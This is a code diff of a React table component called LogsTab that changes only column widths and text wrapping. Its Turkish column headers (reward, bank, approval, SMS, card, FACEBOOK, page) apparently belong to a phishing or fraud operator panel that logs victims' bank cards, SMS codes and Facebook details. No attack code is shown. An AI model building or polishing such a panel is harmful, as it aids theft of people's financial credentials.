@@ -2236,23 +2236,23 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
       {/* TABLE */}
       <div className={`rounded-3xl border shadow-[0_8px_30px_rgb(0,0,0,0.04)] overflow-hidden backdrop-blur-xl ${darkMode ? 'bg-[#1c1c1e]/70 border-white/5' : 'bg-white/80 border-[#d2d2d7]/50'}`}>
-        <div className="overflow-x-auto pb-4">
-          <table className="w-full table-auto border-collapse text-[10px] text-left lg:text-[11px]">
+        <div className="w-full pb-4">
+          <table className="w-full table-fixed border-collapse text-[10px] text-left lg:text-[11px]">
             <thead className={`text-[11px] uppercase tracking-wider font-semibold border-b ${darkMode ? 'bg-black/20 text-gray-400 border-white/5' : 'bg-gray-50/50 text-gray-500 border-gray-100'}`}>
               <tr>
-                <th className="min-w-[75px] px-2 py-3 font-semibold whitespace-nowrap text-center">İzle</th>
-                <th className="min-w-[60px] px-2 py-3 font-semibold whitespace-nowrap">Ödül</th>
-                <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">İsim</th>
-                <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Numara</th>
-                <th className="min-w-[180px] px-2 py-3 font-semibold whitespace-nowrap">Banka</th>
-                <th className="min-w-[110px] px-2 py-3 font-semibold whitespace-nowrap">Onay</th>
-                <th className="min-w-[130px] px-2 py-3 font-semibold whitespace-nowrap">Generator</th>
-                <th className="min-w-[80px] px-2 py-3 font-semibold whitespace-nowrap">SMS</th>
-                <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Kart</th>
-                <th className="min-w-[110px] px-2 py-3 font-semibold whitespace-nowrap">FACEBOOK</th>
-                <th className="min-w-[90px] px-2 py-3 font-semibold whitespace-nowrap">Sayfa</th>
-                <th className="min-w-[70px] px-2 py-3 font-semibold whitespace-nowrap">Durum</th>
-                <th className="min-w-[150px] px-2 py-3 font-semibold text-right whitespace-nowrap">İşlemler</th>
+                <th className="w-[6%] px-2 py-3 font-semibold text-center">İzle</th>
+                <th className="w-[5%] px-2 py-3 font-semibold">Ödül</th>
+                <th className="w-[7%] px-2 py-3 font-semibold">İsim</th>
+                <th className="w-[6%] px-2 py-3 font-semibold">Numara</th>
+                <th className="w-[13%] px-2 py-3 font-semibold">Banka</th>
+                <th className="w-[7%] px-2 py-3 font-semibold">Onay</th>
+                <th className="w-[9%] px-2 py-3 font-semibold">Generator</th>
+                <th className="w-[5%] px-2 py-3 font-semibold">SMS</th>
+                <th className="w-[6%] px-2 py-3 font-semibold">Kart</th>
+                <th className="w-[8%] px-2 py-3 font-semibold">FACEBOOK</th>
+                <th className="w-[7%] px-2 py-3 font-semibold">Sayfa</th>
+                <th className="w-[6%] px-2 py-3 font-semibold">Durum</th>
+                <th className="w-[15%] px-2 py-3 font-semibold text-right">İşlemler</th>
               </tr>
             </thead>
             <tbody className={`divide-y ${darkMode ? 'divide-white/5' : 'divide-gray-100'}`}>
@@ -2368,7 +2368,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
                 return (
                   <tr key={row.id} className={`${darkMode ? 'hover:bg-white/[0.02]' : 'hover:bg-black/[0.01]'} transition-colors duration-200 group`}>
-                    <td className="px-2 py-3 align-middle whitespace-nowrap text-center">
+                    <td className="px-2 py-3 align-middle whitespace-normal break-words text-center">
                       <div className="inline-flex items-center gap-1">
                       <button
                         type="button"
@@ -2419,7 +2419,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                       </button>
                       </div>
                     </td>
-                    <td className="px-2 py-3 align-top whitespace-nowrap font-bold text-sm lg:text-base text-[#EB5E28]">
+                    <td className="px-2 py-3 align-top whitespace-normal break-words font-bold text-sm lg:text-base text-[#EB5E28]">
                       {row.amount ? `€${row.amount}` : '-'}
                     </td>
                     <td className="px-2 py-3 align-top">
